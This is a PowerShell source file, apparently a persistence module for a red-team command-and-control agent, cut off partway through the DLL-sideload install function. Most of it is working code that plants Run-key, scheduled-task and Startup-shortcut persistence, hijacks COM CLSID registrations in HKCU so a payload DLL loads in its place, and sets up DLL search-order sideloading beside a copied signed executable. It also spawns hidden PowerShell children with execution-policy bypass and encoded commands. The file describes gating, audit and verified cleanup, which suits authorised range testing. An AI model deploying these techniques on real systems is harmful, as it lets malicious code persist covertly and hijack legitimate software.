# VARVEL - GOVERNED PERSISTENCE TIER (roadmap #8), persistent PowerShell host.
#
# Standard red-team persistence for the Windows range agent - the capability every
# serious C2 ships - built the VARVEL way: default-OFF, double-gated (the engagement's
# persist.enabled setting AND the agent's own launch flag; the caller enforces both
# BEFORE a job ever reaches this host), fully audited, and with MANDATORY CLEANUP-PROOF:
#
#   PERSISTENCE THAT CANNOT PROVE ITS OWN REMOVAL NEVER INSTALLS.
#
# What this host does (stage 1 scope - Windows, USER-LAND ONLY):
#   runkey  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run value (user-context)
#   schtask - user-context scheduled task (on-logon trigger, Interactive principal of
#             the CURRENT user, RunLevel Limited - NOT elevated)
#   startup - shell:startup folder .lnk via WScript.Shell COM (user-context)
# Stage 2 (DEEP PERSISTENCE - quieter user-land techniques, the identical doctrine):
#   comhijack - a user-context COM hijack: HKCU\Software\Classes\CLSID\{...}\
#             InprocServer32 (Default) pointed at our payload DLL. The candidate CLSID
#             is CLASSIFIED before any write (safe-abandoned vs SHADOW - a hijack that
#             overrides an HKLM registration for this user, higher impact, flagged - vs
#             occupied-user). TRIGGER MODEL, honestly: the payload loads WHEN ANY
#             user-context process instantiates the CLSID - opportunistic, NOT a
#             guaranteed timer. persist-status with prove:true runs the BENIGN
#             resolve-proof: a throwaway child instantiates the CLSID (any outcome but
#             REGDB_E_CLASSNOTREG proves the hijack resolves) and is confirmed to EXIT
#             cleanly.
#   dllsearch - DLL search-order persistence: the execproxy tier's sideload plant
#             (copy a signed host into the governed dir, write our DLL beside it under
#             the hijacked name - copies only, never in place, never beside the
#             original; foreign bytes are a loud refused-clobber) PLUS a classic
#             runkey/schtask trigger pointing at the COPY (armed last, journaled like
#             any registry value). Removal disarms the trigger FIRST, then deletes only
#             hash-matching plants, then the plant dir.
# Each technique supports install / status (present + intact + pointing at the right
# target line, LIVE re-read - measured now, never remembered) / remove.
#
# CLEANUP-PROOF MACHINERY (the actual point):
#   - install() snapshots the PRE-INSTALL state first (never write what you cannot put
#     back), REFUSES to clobber a foreign value unless overwrite was passed AND the old
#     value is journaled into the removal manifest (restore-on-remove), then PROVES the
#     write by re-read.
#   - remove() executes and then VERIFIES absence by re-read (a journaled pre-install
#     value is RESTORED and re-verified instead). A removal that cannot verify is
#     'removal-failed' - LOUD, kept in the manifest as an open loose end, escalated
#     channel-side as 'persist.remove-failed'. Never a quiet lie.
#   - The REMOVAL MANIFEST (JSON at the job's manifestPath - the agent's sandbox) is
#     what makes state that survives this process accountable: every installed location
#     is recorded with its pre-install snapshot, so a LATER process (including an agent
#     relaunched BY the persistence itself) can still remove-verifiably what a previous
#     incarnation installed.
#   - The 'audit' op is the engagement sweep: every manifest entry re-probed LIVE;
#     clean === true ONLY with zero open entries.
#
# HARD BOUNDARY (this wave, stated plainly): user-land only. NO kernel, NO services-as-
# SYSTEM, NO WMI event subscriptions, NO HKLM/machine-wide hives. Everything here runs
# with exactly the privileges the agent already has - persistence, never privilege
# escalation.
#
# THE RELAUNCH LINE arrives in the job (target) - captured AGENT-SIDE at install (the
# Node wrapper / PS agent builds its OWN launch line: same binary/script, same args).
# The channel never ships a command line. Honest note: the line embeds the agent's
# callback token; every location here is USER-context and user-readable by construction
# (HKCU, the user's own tasks, the user's own Startup folder) - the same privilege class
# as the agent itself. Stated, not hidden.
#
# Wire protocol (the REPL the Node side drives - agents/persist.mjs):
#   stdin:  ONE JSON job per line
#     {"op":"install","techniques":["runkey",...],"target":"<relaunch line>","name":null|"VARVEL-xxxx","overwrite":false,"manifestPath":"..."}
#     {"op":"install","techniques":["comhijack"],"deep":{"clsid":"{GUID}","dll":"C:\\...\\payload.dll"},"name":...,"overwrite":false,"manifestPath":"..."}
#     {"op":"install","techniques":["dllsearch"],"deep":{"host":"C:\\...\\signed.exe","as":"apphelp.dll","dll":"C:\\...\\payload.dll","trigger":"runkey"},"name":...,"manifestPath":"..."}
#     {"op":"status","techniques":[...]|null,"name":...,"prove":false,"manifestPath":"..."}   (prove:true = the benign resolve-proof on installed comhijack rows)
#     {"op":"remove","techniques":[...]|null,"all":false,"name":...,"manifestPath":"..."}
#     {"op":"audit","manifestPath":"..."}
#   stdout: ONE JSON result per job, op FIRST (the 120-char ledger preview carries it):
#     {"op","pid","state","techniques":{"runkey":{"state","location","target",
#     "targetSha256","preExisted","overwriteJournaled","installVerified",
#     "removalVerified","journalRestored","note","error"},...},"at"}
#     audit: {"op":"audit","pid","state":"clean"|"unclean","clean":bool,"entries":[...],"open":[...],"at"}
#
# This file is MIRROR-INLINED into agents/varvel-agent.ps1 (the real range agent is
# staged as a single self-contained file - va-boot.ps1 drops it alone). The library
# block between the ==PERSIST-LIB== markers is byte-identical in both files by
# convention; change one, change the other.

$ErrorActionPreference = 'Stop'

# ==PERSIST-LIB== begin (mirror: agents/varvel-agent.ps1) -----------------------------

function Get-VvPersistSha256Hex([string]$Text) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash([Text.Encoding]::UTF8.GetBytes([string]$Text)))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}

function Get-VvPersistTag([string]$Seed) { return 'VARVEL-' + (Get-VvPersistSha256Hex $Seed).Substring(0, 8) }

function Test-VvPersistName([string]$Name) { return ([string]$Name -match '^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$') }

# Split a relaunch command line into executable + argument tail (quoted-exe aware). The
# CANONICAL value form - (Exe + ' ' + Args).Trim() - is what registry values, scheduled
# task actions, and .lnk TargetPath/Arguments all round-trip to, so every compare runs
# through it (a quoted exe loses its quotes inside a .lnk; the canonical form does not).
function Split-VvCommandLine([string]$Target) {
  $t = ([string]$Target).Trim()
  if ($t.StartsWith('"')) {
    $i = $t.IndexOf('"', 1)
    if ($i -gt 1) { return @{ Exe = $t.Substring(1, $i - 1); Args = $t.Substring($i + 1).Trim() } }
  }
  $sp = $t.IndexOf(' ')
  if ($sp -lt 0) { return @{ Exe = $t; Args = '' } }
  return @{ Exe = $t.Substring(0, $sp); Args = $t.Substring($sp + 1).Trim() }
}
function ConvertTo-VvCanonicalTarget([string]$Target) {
  $p = Split-VvCommandLine $Target
  return (($p.Exe + ' ' + $p.Args).Trim())
}

# The canonical user-land locations (stage 1). $Name is the operator-visible handle
# ('VARVEL-<sha8>' by default, or an operator-chosen name) - every location is
# user-context only.
function Get-VvPersistLoc([string]$Tech, [string]$Name) {
  switch ($Tech) {
    'runkey' {
      return @{ Technique = 'runkey'; Name = $Name; RegPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; ValueName = $Name; Location = ('HKCU\Software\Microsoft\Windows\CurrentVersion\Run\' + $Name) }
    }
    'schtask' {
      return @{ Technique = 'schtask'; Name = $Name; TaskName = $Name; Location = ('\' + $Name) }
    }
    'startup' {
      $lnk = Join-Path ([Environment]::GetFolderPath('Startup')) ($Name + '.lnk')
      return @{ Technique = 'startup'; Name = $Name; LnkPath = $lnk; Location = $lnk }
    }
    default { throw "unknown persist technique: $Tech (stage 1 ships runkey, schtask, startup only - Windows user-land; no kernel, no SYSTEM services, no WMI subscriptions)" }
  }
}

function Probe-VvPersistTech($Loc) {
  switch ($Loc.Technique) {
    'runkey' {
      $item = Get-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -ErrorAction SilentlyContinue
      if ($null -ne $item -and $null -ne $item.($Loc.ValueName)) { return @{ Present = $true; Value = [string]$item.($Loc.ValueName) } }
      return @{ Present = $false; Value = $null }
    }
    'schtask' {
      $t = Get-ScheduledTask -TaskName $Loc.TaskName -ErrorAction SilentlyContinue
      if ($null -eq $t) { return @{ Present = $false; Value = $null } }
      $a = @($t.Actions)[0]
      $val = ''
      if ($null -ne $a) { $val = ([string]$a.Execute + ' ' + [string]$a.Arguments).Trim() }
      return @{ Present = $true; Value = $val }
    }
    'startup' {
      if (-not (Test-Path -LiteralPath $Loc.LnkPath)) { return @{ Present = $false; Value = $null } }
      $ws = New-Object -ComObject WScript.Shell
      try {
        $sc = $ws.CreateShortcut($Loc.LnkPath)
        $val = ([string]$sc.TargetPath + ' ' + [string]$sc.Arguments).Trim()
      } finally { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($ws) }
      return @{ Present = $true; Value = $val }
    }
  }
}

function Apply-VvPersistTech($Loc, [string]$Target) {
  switch ($Loc.Technique) {
    'runkey' {
      New-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -Value ([string]$Target) -PropertyType String -Force -ErrorAction Stop | Out-Null
    }
    'schtask' {
      $parts = Split-VvCommandLine $Target
      if ($parts.Args.Length -gt 0) { $action = New-ScheduledTaskAction -Execute $parts.Exe -Argument $parts.Args -ErrorAction Stop }
      else { $action = New-ScheduledTaskAction -Execute $parts.Exe -ErrorAction Stop }
      $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
      $principal = New-ScheduledTaskPrincipal -UserId ([Security.Principal.WindowsIdentity]::GetCurrent().Name) -LogonType Interactive -RunLevel Limited -ErrorAction Stop
      Register-ScheduledTask -TaskName $Loc.TaskName -Action $action -Trigger $trigger -Principal $principal -Description 'VARVEL governed range persistence (cleanup-proof tier - removal verified by persist-remove)' -Force -ErrorAction Stop | Out-Null
    }
    'startup' {
      $parts = Split-VvCommandLine $Target
      $ws = New-Object -ComObject WScript.Shell
      try {
        $sc = $ws.CreateShortcut($Loc.LnkPath)
        $sc.TargetPath = $parts.Exe
        $sc.Arguments = $parts.Args
        try { $sc.WorkingDirectory = (Split-Path $parts.Exe -Parent) } catch {}
        $sc.Description = 'VARVEL governed range persistence (cleanup-proof tier)'
        $sc.WindowStyle = 7
        $sc.Save()
      } finally { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($ws) }
    }
  }
}

function Clear-VvPersistTech($Loc) {
  switch ($Loc.Technique) {
    'runkey' { Remove-ItemProperty -LiteralPath $Loc.RegPath -Name $Loc.ValueName -Force -ErrorAction Stop }
    'schtask' { Unregister-ScheduledTask -TaskName $Loc.TaskName -Confirm:$false -ErrorAction Stop }
    'startup' { Remove-Item -LiteralPath $Loc.LnkPath -Force -ErrorAction Stop }
  }
}

# --- DEEP PERSISTENCE (stage 2): comhijack + dllsearch — the identical cleanup-proof ---
# --- doctrine against quieter USER-LAND locations. The standing boundary holds: NO  ---
# --- HKLM hives, NO services, NO WMI subscriptions. (Twin: the deep half of          ---
# --- engine/persist.mjs.)                                                          ---

function Test-VvPersistClsid([string]$Clsid) { return ([string]$Clsid -match '^\{[0-9A-Fa-f]{8}-([0-9A-Fa-f]{4}-){3}[0-9A-Fa-f]{12}\}$') }

function Get-VvPersistFileSha256([string]$Path) { return (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() }

function Probe-VvPersistFile([string]$Path) {
  if (Test-Path -LiteralPath $Path -PathType Leaf) { return @{ Present = $true; Sha256 = (Get-VvPersistFileSha256 $Path) } }
  return @{ Present = $false; Sha256 = $null }
}

# The trigger models - deep status carries one per technique, ALWAYS (what event loads
# us; stated, never implied).
function Get-VvPersistTriggerModel([string]$Tech) {
  switch ($Tech) {
    'comhijack' { return 'fires WHEN ANY user-context process calls CoCreateInstance/CreateObject on the hijacked CLSID - opportunistic, NOT a guaranteed timer: cadence depends entirely on what instantiates the class (a shadowed in-use class fires with its host app; an abandoned class may fire rarely - that is exactly why it is quiet)' }
    'dllsearch' { return 'fires at the next interactive logon of this user via the classic trigger (runkey/schtask) pointing at the COPIED signed host; the copy then search-order-loads our DLL from its own directory - guaranteed at next logon, two-stage' }
    default { return $null }
  }
}

# The manifest entry key for a deep technique: comhijack keys PER-CLSID (several
# hijacks coexist under one agent name handle); dllsearch keys per technique (its plant
# dir + trigger are name-derived - one plant per handle, like a classic technique).
function Get-VvDeepEntryKey([string]$Tech, $Deep) {
  if ($Tech -eq 'comhijack') { return 'comhijack-' + (([string]$Deep.clsid).ToUpper() -replace '[{}-]', '').Substring(0, 8) }
  return $Tech
}

# Probe the InprocServer32 (Default) of a CLSID in one hive ('HKLM' for classification
# ONLY - never written; 'HKCU' for the hijack itself).
function Probe-VvComRegistration([string]$Hive, [string]$Clsid) {
  $keyPath = ($Hive + ':\Software\Classes\CLSID\' + $Clsid.ToUpper())
  $isp = ($keyPath + '\InprocServer32')
  $item = Get-ItemProperty -LiteralPath $isp -Name '(Default)' -ErrorAction SilentlyContinue
  if ($null -ne $item -and $null -ne $item.'(Default)') { return @{ Present = $true; Value = [string]$item.'(Default)'; ContainerPresent = $true } }
  return @{ Present = $false; Value = $null; ContainerPresent = (Test-Path -LiteralPath $keyPath) }
}

# The candidate classifier (shadow-vs-safe) - the twin of classifyComCandidate in
# engine/persist.mjs. A user hijack of an HKLM-registered class SHADOWS it (the host
# app's behavior changes: higher impact, flagged); a class registered nowhere is
# 'safe-abandoned' (alters no working app - and is quiet BECAUSE nothing uses it; the
# trigger is opportunistic, never a timer).
function Get-VvComCandidateClass([string]$Clsid) {
  $hklm = Probe-VvComRegistration 'HKLM' $Clsid
  $hkcu = Probe-VvComRegistration 'HKCU' $Clsid
  if ($hkcu.Present) {
    return @{ classification = 'occupied-user'; shadow = $false; hklmPresent = $hklm.Present; hkcu = $hkcu;
      impact = 'a user-context registration already exists for this CLSID - a FOREIGN one is never clobbered silently (refuse, or overwrite journals it and restore-on-remove puts it back)' }
  }
  if ($hklm.Present) {
    return @{ classification = 'shadow'; shadow = $true; hklmPresent = $true; hklmValue = $hklm.Value; hkcu = $hkcu;
      impact = 'SHADOWS the machine-wide (HKLM) registration for THIS user - processes of this user that instantiate the class load OUR server instead of the real one: the host application''s behavior changes. HIGHER IMPACT - flagged loudly in evidence and audit; removal un-shadows (HKLM is never touched)' }
  }
  return @{ classification = 'safe-abandoned'; shadow = $false; hklmPresent = $false; hkcu = $hkcu;
    impact = 'no HKLM/HKCU registration exists - a user-context registration alters NO working application (instantiation previously failed with REGDB_E_CLASSNOTREG). HONEST TRIGGER TENSION: a genuinely abandoned class may be instantiated rarely - it is quiet BECAUSE nothing uses it; the trigger is opportunistic, not a timer' }
}

function Apply-VvComHijack([string]$Clsid, [string]$Dll) {
  $keyPath = ('HKCU:\Software\Classes\CLSID\' + $Clsid.ToUpper() + '\InprocServer32')
  New-Item -Path $keyPath -Force -ErrorAction Stop | Out-Null
  New-ItemProperty -LiteralPath $keyPath -Name '(Default)' -Value ([string]$Dll) -PropertyType String -Force -ErrorAction Stop | Out-Null
}

# Delete the hijack. When WE created the whole key chain (container did NOT pre-exist),
# the container goes too; when it pre-existed, only the subkey we added is removed.
# HKLM is never touched - removing the HKCU key of a shadow install simply un-shadows.
function Clear-VvComHijack([string]$Clsid, [bool]$ContainerPreExisted) {
  $clsidKey = ('HKCU:\Software\Classes\CLSID\' + $Clsid.ToUpper())
  $isp = ($clsidKey + '\InprocServer32')
  if ($ContainerPreExisted) {
    if (Test-Path -LiteralPath $isp) { Remove-Item -LiteralPath $isp -Recurse -Force -ErrorAction Stop }
  } else {
    if (Test-Path -LiteralPath $clsidKey) { Remove-Item -LiteralPath $clsidKey -Recurse -Force -ErrorAction Stop }
  }
}

# THE BENIGN RESOLVE-PROOF (persist-status prove:true, comhijack): a THROWAWAY child
# process instantiates the hijacked CLSID. Any outcome OTHER than REGDB_E_CLASSNOTREG
# (0x80040154) proves COM located our registration and attempted the load - the hijack
# RESOLVES (the payload's own loadability is a separate, stated fact). The child is
# confirmed to EXIT cleanly. The proof is read-only against the registry and changes no
# persistent state.
function Invoke-VvComResolveProof([string]$Clsid, [string]$WorkDir) {
  $proof = @{ attempted = $false; resolved = $false; hresult = $null; detail = $null; childExited = $false; childExitCode = $null }
  $body = @'
$clsid = '__CLSID__'
try {
  $t = [type]::GetTypeFromCLSID([Guid]$clsid)
  if ($null -eq $t) {
    Write-Output 'COMPROOF|0|null-type|GetTypeFromCLSID returned null - the class does not resolve'
  } else {
    try {
      $obj = [Activator]::CreateInstance($t)
      Write-Output 'COMPROOF|1|0|object created - the registered server for the hijacked CLSID loaded into this throwaway child'
    } catch {
      $hr = ''
      try { $hr = ('0x{0:X8}' -f $_.Exception.HResult) } catch {}
      $msg = ([string]$_.Exception.Message) -replace '[\r\n|]+', ' '
      if ($msg -match '80040154' -or $msg -match '(?i)class not registered') {
        Write-Output ('COMPROOF|0|' + $hr + '|class not registered (0x80040154) - the hijack does NOT resolve')
      } else {
        Write-Output ('COMPROOF|1|' + $hr + '|COM located our registration and attempted the load: ' + $msg)
      }
    }
  }
} catch {
  $m = ([string]$_.Exception.Message) -replace '[\r\n|]+', ' '
  Write-Output ('COMPROOF|0||' + $m)
}
'@
  $body = $body.Replace('__CLSID__', $Clsid)
  try {
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($body))
    # ProcessStartInfo with UseShellExecute=$false: WaitForExit/ExitCode are reliable
    # (Start-Process -PassThru can return a handle whose ExitCode never populates), and
    # stdout/stderr ride pipes - no scratch files at all.
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = 'powershell.exe'
    $psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ' + $encoded
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $proof.attempted = $true
    if (-not $p.WaitForExit(20000)) {
      try { $p.Kill() } catch {}
      $proof.detail = 'proof child timed out after 20s - killed; the proof is inconclusive, reported honestly'
      return $proof
    }
    $proof.childExited = $true
    try { $proof.childExitCode = $p.ExitCode } catch { $proof.childExitCode = $null }
    $childOut = ''
    try { $childOut = $p.StandardOutput.ReadToEnd() } catch {}
    $line = $null
    if ($childOut) { $line = ($childOut -split "`r?`n") | Where-Object { $_ -match '^COMPROOF\|' } | Select-Object -First 1 }
    if ($line) {
      $parts = ([string]$line).Split('|')
      $proof.resolved = ($parts[1] -eq '1')
      if ($parts.Count -ge 3 -and $parts[2]) { $proof.hresult = $parts[2] }
      if ($parts.Count -ge 4 -and $parts[3]) {
        $proof.detail = ($parts[3..($parts.Count - 1)] -join '|')
        $m = [regex]::Match([string]$proof.detail, 'HRESULT: (0x[0-9A-Fa-f]{8})')
        if ($m.Success) { $proof.hresult = $m.Groups[1].Value } # the COM-level HRESULT, not the .NET wrapper's
      }
    } else {
      $proof.detail = 'the proof child produced no COMPROOF marker (inconclusive, reported honestly)'
    }
    try { $p.Dispose() } catch {}
  } catch {
    $proof.detail = 'proof launch failed: ' + [string]$_.Exception.Message
  }
  return $proof
}

# The deep params validator (defense in depth - the same rules as parseDeepParams in
# engine/persist.mjs; the channel's spec gate already ran server-side).
function Assert-VvDeepParams([string]$Tech, $Deep) {
  if ($null -eq $Deep) { throw "persist: deep technique '$Tech' needs a 'deep' params object" }
  $absRe = '^([A-Za-z]:\\|\\\\|%[A-Za-z]+%\\)'
  if ($Tech -eq 'comhijack') {
    if (-not (Test-VvPersistClsid ([string]$Deep.clsid))) { throw "persist: deep.clsid '$($Deep.clsid)' is not a CLSID ({GUID})" }
    $dll = [string]$Deep.dll
    if (-not $dll -or $dll -notmatch $absRe -or $dll -notmatch '\.dll$' -or $dll.Contains('..')) { throw "persist: deep.dll must be an ABSOLUTE .dll path without '..'" }
    return
  }
  if ($Tech -eq 'dllsearch') {
    $h = [string]$Deep.host; $dll = [string]$Deep.dll; $as = ([string]$Deep.as).ToLower()
    if (-not $h -or $h -notmatch $absRe -or $h -notmatch '\.exe$' -or $h.Contains('..')) { throw "persist: deep.host must be an ABSOLUTE .exe path without '..'" }
    if (-not $dll -or $dll -notmatch $absRe -or $dll -notmatch '\.dll$' -or $dll.Contains('..')) { throw "persist: deep.dll must be an ABSOLUTE .dll path without '..'" }
    $allow = @('version.dll', 'winmm.dll', 'dbghelp.dll', 'dbgcore.dll', 'cryptsp.dll', 'profapi.dll', 'apphelp.dll')
    if ($allow -notcontains $as) { throw "persist: deep.as must be one of $($allow -join ', ') (the execproxy stage-1 search-order allowlist, reused)" }
    $trig = $(if ($Deep.trigger) { ([string]$Deep.trigger).ToLower() } else { 'runkey' })
    if (@('runkey', 'schtask') -notcontains $trig) { throw "persist: deep.trigger must be one of runkey, schtask" }
    return
  }
  throw "persist: unknown deep technique '$Tech'"
}

# The deep evidence row: the classic fields PLUS the trigger model (always) and the
# per-technique deep fields.
function New-VvDeepEv([string]$Tech, [string]$Key, [string]$Location, [string]$Target, $Deep) {
  $ev = [ordered]@{
    state = 'failed'; technique = $Tech; entryKey = $Key; location = $Location
    target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null })
    preExisted = $false; overwriteJournaled = $false
    installVerified = $null; removalVerified = $null; journalRestored = $null
    triggerModel = (Get-VvPersistTriggerModel $Tech)
    note = $null; error = $null
  }
  if ($Tech -eq 'comhijack') {
    $ev.clsid = ([string]$Deep.clsid).ToUpper(); $ev.dll = [string]$Deep.dll
    $ev.classification = $null; $ev.shadow = $false; $ev.dllSha256 = $null; $ev.resolveProof = $null
  } elseif ($Tech -eq 'dllsearch') {
    $ev.host = [string]$Deep.host; $ev.as = ([string]$Deep.as).ToLower(); $ev.dll = [string]$Deep.dll
    $ev.plantDir = $null; $ev.trigger = $null
    $ev.dllSha256 = $null; $ev.hostSha256 = $null; $ev.hostSigStatus = $null; $ev.hostSigner = $null
    $ev.files = @()
  }
  return $ev
}

function Save-VvDeepEntry($Manifest, [string]$Key, [string]$Tech, $Ev, $DeepJournal, $PreInstall, [bool]$Journaled) {
  $prev = $Manifest.entries[$Key]
  $Manifest.entries[$Key] = @{
    technique = $Tech; location = $Ev.location; targetSha256 = $Ev.targetSha256
    deep = $DeepJournal
    preInstall = $PreInstall
    overwriteJournaled = $Journaled
    # honest state: an install whose write did NOT verify is recorded as 'failed' (the
    # entry exists so remove can still take it back - the sweep re-probes live)
    state = $(if ($Ev.state -eq 'installed') { 'installed' } else { 'failed' })
    installedAt = $(if ($prev -and $prev.installedAt) { [string]$prev.installedAt } else { [DateTime]::UtcNow.ToString('o') })
    removedAt = $null; removalVerified = $null
  }
}

# comhijack install: classify the candidate FIRST (shadow-vs-safe), require the staged
# payload (existence + sha256 evidence), snapshot the pre-install value, refuse/journal
# a foreign value, write the hijack, PROVE by re-read.
function Install-VvDeepComHijack([string]$Key, [string]$Name, $Deep, $Manifest, [bool]$Overwrite) {
  $clsid = ([string]$Deep.clsid).ToUpper()
  $dll = [string]$Deep.dll
  $location = ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32')
  $ev = New-VvDeepEv 'comhijack' $Key $location $dll $Deep
  try {
    $cls = Get-VvComCandidateClass $clsid
    $ev.classification = [string]$cls.classification
    $ev.shadow = ($cls.shadow -eq $true)
    $probe = Probe-VvPersistFile $dll
    if (-not $probe.Present) { $ev.error = 'payload DLL not found at ' + $dll + ' - stage it into the governed sandbox first (nothing written)'; return $ev }
    $ev.dllSha256 = $probe.Sha256
    $pre = Probe-VvComRegistration 'HKCU' $clsid
    $ev.preExisted = $pre.Present
    $journal = @{ technique = 'comhijack'; clsid = $clsid; dll = $dll; dllSha256 = $ev.dllSha256; classification = $ev.classification; shadow = $ev.shadow; containerPresent = $pre.ContainerPresent }
    if ($pre.Present -and ([string]$pre.Value) -eq $dll) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (the InprocServer32 re-read matches the payload path) - idempotent no-op'
      Save-VvDeepEntry $Manifest $Key 'comhijack' $ev $journal @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'the InprocServer32 already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.'
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvComHijack $clsid $dll
    $post = Probe-VvComRegistration 'HKCU' $clsid
    $ev.installVerified = ($post.Present -and ([string]$post.Value) -eq $dll)
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'hijack write did NOT verify (re-read mismatch - the InprocServer32 does not hold the payload path). Nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
      $ev.note = $(if ($ev.shadow) { 'SHADOW install: ' } else { 'safe-abandoned install: ' }) + [string]$cls.impact
    }
    Save-VvDeepEntry $Manifest $Key 'comhijack' $ev $journal @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# dllsearch install: the execproxy sideload plant (COPIES ONLY into the governed dir -
# foreign bytes are a loud refused-clobber, plants proven by sha256 re-read) PLUS a
# classic runkey/schtask trigger pointing at the COPY, armed LAST, with the classic
# registry discipline (snapshot / refuse-or-journal / re-read verify).
function Install-VvDeepDllSearch([string]$Key, [string]$Name, $Deep, $Manifest, [bool]$Overwrite, [string]$ManifestPath) {
  $sandbox = Split-Path $ManifestPath -Parent
  if (-not $sandbox) { $sandbox = (Get-Location).Path }
  $plantDir = Join-Path $sandbox ('persist-dllsearch-' + $Name)
  $hostBase = Split-Path ([string]$Deep.host) -Leaf
  $hostCopy = Join-Path $plantDir $hostBase
  $as = ([string]$Deep.as).ToLower()
  $dllAs = Join-Path $plantDir $as
  $targetLine = '"' + $hostCopy + '"'
  $triggerTech = $(if ($Deep.trigger) { ([string]$Deep.trigger).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  $ev.plantDir = $plantDir
  $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
  $journal = @{ technique = 'dllsearch'; host = [string]$Deep.host; hostSha256 = $null; as = $as; dll = [string]$Deep.dll; dllSha256 = $null; plantDir = $plantDir; trigger = @{ technique = $triggerTech; location = $trigLoc.Location; value = $targetLine; targetSha256 = (Get-VvPersistSha256Hex $targetLine) }; files = @() }
  try {
    $dllProbe = Probe-VvPersistFile ([string]$Deep.dll)
    if (-not $dllProbe.Present) { $ev.error = 'payload DLL not found at ' + [string]$Deep.dll + ' - stage it into the governed sandbox first (nothing planted, nothing armed)'; return $ev }
    $ev.dllSha256 = $dllProbe.Sha256; $journal.dllSha256 = $dllProbe.Sha256
    $hostProbe = Probe-VvPersistFile ([string]$Deep.host)
    if (-not $hostProbe.Present) { $ev.error = 'sideload host not found at ' + [string]$Deep.host + ' - discovery (tools/execproxy.mjs) ranks candidates; nothing planted, nothing armed'; return $ev }
    $ev.hostSha256 = $hostProbe.Sha256; $journal.hostSha256 = $hostProbe.Sha256
    try {
      $sig = Get-AuthenticodeSignature -LiteralPath ([string]$Deep.host) -ErrorAction Stop
      $ev.hostSigStatus = [string]$sig.Status
      if ($sig.SignerCertificate) { $ev.hostSigner = [string]$sig.SignerCertificate.Subject }
    } catch {}
    if (-not (Test-Path -LiteralPath $plantDir)) { New-Item -ItemType Directory -Force -Path $plantDir -ErrorAction Stop | Out-Null }
    $plants = @(
      @{ role = 'host-copy'; path = $hostCopy; copyFrom = [string]$Deep.host; want = $ev.hostSha256 },
      @{ role = 'dll-as'; path = $dllAs; copyFrom = [string]$Deep.dll; want = $ev.dllSha256 }
    )
    foreach ($f in $plants) {
      $rec = [ordered]@{ role = $f.role; path = $f.path; sha256 = $null; present = $false; planted = $false; preExisted = $false; removalVerified = $null }
      $preF = Probe-VvPersistFile $f.path
      $rec.preExisted = $preF.Present
      if ($preF.Present) {
        if ($preF.Sha256 -ne $f.want) {
          $rec.present = $true; $rec.sha256 = $preF.Sha256
          $ev.files = @($ev.files) + $rec
          $ev.state = 'refused-clobber'
          $ev.error = 'plant target already holds FOREIGN bytes (sha256 ' + $preF.Sha256.Substring(0, 12) + '...): ' + $f.path + ' - REFUSED to clobber it silently (files are never journaled). persist-remove this name first, or pick another name handle.'
          $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
          Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
          return $ev
        }
        $rec.present = $true; $rec.sha256 = $preF.Sha256; $rec.planted = $true
        $ev.files = @($ev.files) + $rec
        continue
      }
      Copy-Item -LiteralPath $f.copyFrom -Destination $f.path -Force -ErrorAction Stop
      $postF = Probe-VvPersistFile $f.path
      if (-not $postF.Present -or $postF.Sha256 -ne $f.want) {
        $rec.present = $postF.Present; $rec.sha256 = $postF.Sha256
        $ev.files = @($ev.files) + $rec
        $ev.error = 'plant write did NOT verify (sha256 re-read mismatch) for ' + $f.path + ' - the plant is UNVERIFIED, reported honestly; remove will still take this entry back'
        $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
        Save-VvDeepEntry $Manifest $Key 'dllsearch' $ev $journal @{ present = $false; value = $null; valueSha256 = $null } $false
        return $ev
      }
      $rec.present = $true; $rec.sha256 = $postF.Sha256; $rec.planted = $true
      $ev.files = @($ev.files) + $rec
    }
    $journal.files = @($ev.files | ForEach-Object { @{ role = $_.role; path = $_.path; sha256 = $_.sha256; planted = ($_.planted -eq $true) } })
    # THE TRIGGER - armed LAST, the classic dance against the runkey/schtask location.
